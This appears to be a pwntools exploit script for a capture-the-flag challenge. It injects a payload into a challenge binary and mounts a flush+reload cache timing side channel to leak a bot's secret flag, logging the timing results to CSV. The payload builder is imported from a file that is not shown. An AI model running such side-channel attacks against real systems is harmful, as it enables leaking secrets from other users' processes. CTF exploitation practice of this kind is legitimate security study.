from challenge.instancer.pow import solve_challenge
from statistics import mean
import time
from probeFinal import *
from pwn import *
from threading import Thread
from csv import writer
import csv

EXE = ELF("challenge/chal/challenge")

context.binary = EXE
context.log_level = 'DEBUG'


# Helper to start the bot (which has the flag)
# (optionally, you can start the bot with a fake flag for debugging)
def start_bot(fake_flag=None):
    if fake_flag is not None:
        p_gateway.sendline("2")
        p_gateway.recvuntil(":")
        p_gateway.sendline(fake_flag)
    else:
        p_gateway.sendline("1")
    p_gateway.recvuntil("Bot spawned")


# times_list is the return value
def flush_reload(io, times_list, pVal):
    # Navigate to the injection point.
    io.recvuntil('-----\n')
    io.send('W')
    io.recvuntil('-----\n')
    # Sending 'H' to trigger the mmap and fread code.
    io.recvuntil('-----\n')
    io.send('H')
    # Read and send the payload.
    payload = final_payload(EXE, pVal) # flush_reload_payload(EXE)
    payload += b'\x00' * (0x1000 - len(payload))
    io.send(payload)
    # Listen for results
    while True:
        try:
            io.recvuntil(b"\nTime:\t\x00", timeout=4)
            result = int.from_bytes(io.recv(8), 'little')
            if result < 10000:
                print(len(times_list))
                curr_time = time.time()
                times_list.append(curr_time)
        except:
            break
    return


# Function that takes the results, and makes them integers representing their 0.25 second interval
def analyzeResults(results):
    currentGroup = []
    groupMeans = []
    for x in results:
        if len(currentGroup) > 0:
            if x - currentGroup[-1] < 0.05:
                currentGroup.append(x)
            else:
                if len(currentGroup) > 1:
                    groupMeans.append(mean(currentGroup))
                currentGroup = [x]
        else:
            currentGroup.append(x)
    baseValue = groupMeans[0]
    groupMeans = [(y-baseValue)*.9947 for y in groupMeans]
    returnVals = []
    for x in groupMeans:
        returnVals.append(math.floor((x-groupMeans[1])*4+0.5)-math.floor((groupMeans[0]-groupMeans[1])*4+0.5))
    return [groupMeans, returnVals]


# Run with step=0,1,2,3 to collect enough data.
# Somtimes the server cries and it errors: just run again until it works
STEP = 2

# Location of the 4 probing locations
locations = [503, 807, 1127, 1447] 

# fill in port number here
p_gateway = remote("3.142.53.224", 9000)

# Solve the proof-of-work if enabled (limits abuse)
pow = p_gateway.recvline()
if pow.startswith(b"== proof-of-work: enabled =="):
    p_gateway.recvline()
    p_gateway.recvline()
    challenge = p_gateway.recvline().decode().split(" ")[-1]
    p_gateway.recvuntil("Solution? ")
    p_gateway.sendline(solve_challenge(challenge))

# Get the IP and port of the instance
p_gateway.recvuntil("ip = ")
ip = p_gateway.recvuntil("\n").decode().strip()
p_gateway.recvuntil("port = ")
port = int(p_gateway.recvuntil("\n").decode().strip())

results = []

io = remote(ip, port)
sleep(2)
# Makes a separate thread so you run the attack while also starting the bot
thread = Thread(target=flush_reload, args=(io, results, locations[STEP]))
thread.start()
sleep(4)
start_bot()
thread.join() # Halt until thread done
io.close()
analyzedResults = analyzeResults(results)
print(analyzedResults[0])
print(analyzedResults[1])

analyzedResults[1].insert(0,STEP)

# Put data into CSV
with open('flush_data.csv', 'a') as f_object:
    writer_object = writer(f_object)
    writer_object.writerow(analyzedResults[1])
    f_object.close()

quit()